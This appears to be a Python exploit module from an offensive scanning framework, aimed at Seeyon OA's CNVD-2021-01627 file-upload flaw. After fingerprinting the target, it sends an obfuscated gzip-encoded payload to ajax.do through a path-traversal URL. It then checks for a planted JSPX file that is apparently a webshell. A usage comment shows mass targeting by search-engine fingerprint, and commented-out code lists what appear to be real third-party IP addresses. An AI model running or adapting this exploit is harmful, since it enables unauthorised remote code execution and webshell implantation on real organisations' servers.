# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 20:45

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.OA.Seeyon.ajax_do_uploadfile -cs -fs "app=\"致远互联-OA\""

class Script(BaseScript):
    name = 'Seeyon'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = 'CNVD-2021-01627'
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip']
        # 相关信息
        self.info = '''version: 致远OA V8.0 | 致远OA V7.1、V7.1SP1 | 致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3 | 致远OA V6.0、V6.1SP1、V6.1SP2 | 致远OA V5.x | 致远OA G6
        '''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '/seeyon/USER-DATA/IMAGES/LOGIN/login.gif' in text or '/seeyon/common/' in text or 'M3 Server' in text or 'M1-Server' in text or '/seeyon/user-data/images/login/login.gif' in text or 'seeyonproductid' in text or "ar _ctxpath = '/seeyon'" in text or 'a8-v5企业版' in text or '/seeyon/' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({"Content-Type": "application/x-www-form-urlencoded"})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                # UkVBRE1FUkVBRE1FUkVBRE1FUkVBRE1F READMEREADMEREADMEREADME
                data = 'managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuT%5B%C2%93%C2%AAF%10%7EN%7E%05%C3%A5%C2%8Bn%C3%AD%C2%89%C2%8B+%C3%AB%C2%9ASyXo%C2%88%28%2A%28%C2%B7T%1E%60%06ap%06%C2%88%5C%04%C2%B7%C3%8E%7F%C3%8F%00nvOe3%2F%C3%93%C3%9D%C3%93%C3%BDM%C3%9F%C3%BF%7C%C3%AB%C2%9E%C3%A2%0B%C3%89%C2%B1s%C2%A8%12%C2%AF%C3%BB%3B3%C3%B8%C3%86%C2%BCK%14%C2%87%C3%94%C2%92n%C3%A6%C2%A5Y%C3%B7C%3C%2F%C2%93%C2%8B%C2%97%C2%A6%28%C2%8E%C3%AAG-%C2%BB%C2%A0%C3%88g%12%27%0B%C2%98%3F%C2%98N%C2%BF%C3%BFt%C3%B5%5C%27I%C3%92%C2%A7%C3%94%C3%B3%C2%AA8z%C3%AA%7C%C3%BF%C2%95i%C3%8F%2F%C2%A1S8%7D%14%C3%B7w%C3%94%243.%28%C3%B3.L%C3%B2As%14+%C3%B2%C2%AE%C3%8C%17j%C2%BD%1A%C3%BF%C2%B1%C2%B3%14%07%1C%3F%14%C2%9E%C3%BBa%C2%9A%C2%94%C2%9D%C2%87%7F%C2%91%C2%99%C2%BB%17i%C3%A0a%5C%C2%BB%C2%B1%13%C2%93%1B%C2%98%25%C2%95%C3%8B%C2%8DYi%19d%C2%AE%28%C3%9C%C2%B6%C2%A4%C2%96%C2%B1%C3%88Y%C2%AA%2C%C2%98%C3%85%C3%85%C2%9AK%02H%C3%A69%C3%A0%C3%B5%7CM%C2%94%C3%82%C3%95%C3%86%C3%B2q%C3%B0Z%1C%C3%85Edk%C2%92%0F%C2%89%5E%01%0E%17n%C3%88%C2%A2%C2%8D6%C2%AC%C2%A4p%C3%B8%C3%A2D%C3%8AuK%C3%94%04%10%3D%C2%84%22%C3%A6lM%C2%B8Z%06%C3%84%C2%92%C2%883+%C2%8E%2BX%C3%A3%C2%93%05gi%C3%82%C2%80%C2%BE%C2%A7k%14%C2%A7%0Do%C3%BA%C2%B9%C3%85%C2%AF%04%C2%B0T%C2%8B%2Fe%14%C3%9766%C2%B9%C2%8C%C2%A4b%17%C2%96%7F%03%C3%BE%C3%B5%C3%99%16%C3%B5%C3%90%15%17%C2%95e%C2%AA%C2%89%C3%8B%0D%1F%25QI-S%C2%B9I%C2%8B%C2%A3o%C2%9B%01k%1B%C3%82%19T%C2%93%19%C3%95%C2%B9%01%C2%B6%2C%2CC%C3%85+%C3%8Aty%C3%9E%C3%AA%1D%C3%84q%401%2AI%C3%9C%24%1E%C2%AF%0C%00%C2%A5eJo%C3%B9%C3%81%15%1A%C2%AB%C3%9416%C3%BE%C2%9E%2B%03%C3%80o%7C%C2%BB%0A%C2%90g%C2%AAXZd%C3%90BxD%C3%A3c%C2%A1%C2%B9%C3%8A%C2%A5ek%C2%B7%26%2A%C2%B6%09%C3%8E%C3%ADc%C2%8B-%C2%8BR%C2%BA%C2%99%C2%96hMJ%C3%AC%12%C3%88%3A%C3%93%C3%B3%C3%A8d%C2%B2%2F4%C2%A7u%C3%9E%C3%8F%C2%B6Q%C3%AB%C2%AD%02%C2%9A%03%C2%9A%C2%BF%7B%C3%9E%22%25%04%04_%C2%A1Xb8%13%0Ep%C2%B9J%5C%02%7C%C3%A7%C3%86%22%C3%BB%C2%B0%1F%C3%98%C2%87M%C2%B55ll%C2%85%C3%BAy%7B%C2%90%06%16%C2%92F%C2%80%C3%93oM%0D%C2%90p%C2%85%C2%A6jXF9%C2%B05%1FAMJ%C2%9D%C3%AA%3C%C3%9As%C3%B8%C3%AA%C2%B41%C2%8E%C3%9F%C3%A95%C2%81%18%C3%8E1%C2%AD%C2%AB%1A%C2%B8D%C3%81%C3%B2t5Q%C3%B5%0D%C2%92%0FY%C2%B8%C2%A618%C3%A6%3E%C3%9E%C2%A02%C2%B7M%C3%A0%1F9%3D%C2%ACc%C3%958%5D8%C3%B2%13lU%7E%C3%BC%C3%A9%C3%8F%C3%88%C3%BE%C3%B9%C3%8FD%C2%AE%24%24k%C2%8D%7CZ%C3%A7%0BT%7E%C2%B2%7E%C3%87%C3%97%C3%8E%23%C2%97%C3%A8%3C%C2%ADO%0C%C3%85+%01U%C2%A3%C3%97%C3%96%C2%A7%C3%96k%C3%BC%C3%BA%C2%B96%C3%B2%C3%B4L%C3%A5+%C2%B6%2A%C3%A1%C3%AC%C2%B26%C3%8D%C3%87%22%C2%95E%01%C3%83jr%C2%83%C3%860w%0D%7C%C2%A3o%C3%93%C2%BD%C2%AE%2C%C2%94P%C2%9D%C3%93%C2%BC%16w%C2%BB%C2%BC%C3%A9%0FN%C3%85%C3%BBH%276%C3%ADUy%C2%B9%C3%82%C3%80%C3%941%C3%A0%C3%B7%C2%B9%C3%8D%C3%A9%C3%AC%C2%91%C3%A8%C3%AF%7F%C3%A4%C2%A0%C2%A6%C3%A9%C3%A0%C2%BA%C3%A4%18S%3F%13%1A%03%C2%8D%1F%C2%AE%C3%9CHa-C%08i%7C%C3%94%0F%C2%BD%C2%84%C3%86%22%05U%C3%90%C3%B4%C3%B4%C2%9E%1B%C3%A7P%C3%94%C2%87%C2%90%C3%96v7%1D7%3D%098%C2%A5r%C3%8C%09%C3%AB%C2%8A%3A%C2%BB%0B%C2%AFE%5B%C3%97U%C3%A1%C3%B2%C3%BB%C3%87%C2%8FAg%C3%92%3C%C3%AA%13%C2%94%C2%82%C3%BE%C3%A4U%C2%9B%3F%0Fg%1E%C2%88%21%C2%9Dux%C2%BF%C3%9B1%C3%BFZ%C2%A9%C3%B7%C3%9F%C2%A9n%C3%8D%C3%AELk%C3%9B2%C2%BD%3B%60%C2%BF%C2%BD%27%C3%B9%C3%A9D%01%C2%9A%25%C3%B0%C3%B0%C2%ADs%3C%2C%7E%7B%C3%B9%C2%BC%24%3E%C2%AF%C2%9A%7E%C3%83%C3%A0%C2%A8%C3%B7%19%C3%BC%C3%BFt%01%C2%8ES%C2%8F%3A%C3%B6%C3%A3%7B%C2%BD%0A%29%01%C2%BD%13%C2%93fN%C2%86%00S%C2%96e%C3%AF%C3%A1%C2%AD%C3%BB%C2%83%C3%AEG%C2%BA%23%C3%9F%C3%AA%3B%C2%BB%C3%A4%5E%C3%B7%C2%AF%7F%00%C3%B7%C3%94%3B%C3%8BZ%05%00%00'
                async with session.post(url=url, headers=headers, data=data, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None:
                        ret_json = await response.json()
                        await asyncio.sleep(2)
                        code_status = ret_json.get('code')
                        if code_status and int(code_status) != -1:
                            url = f'http://{self.target}/seeyon/HG123456.jspx' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/seeyon/HG123456.jspx'
                            async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response2:
                                if response2 is not None and response2.status == 200:
                                    gLogger.myscan_info('[{} CNVD-2021-01627] {}'.format(self.name, url))
                                    return {'name': '{} CNVD-2021-01627'.format(self.name), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    #
    # resp = requests.get('http://222.163.24.206:3945/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
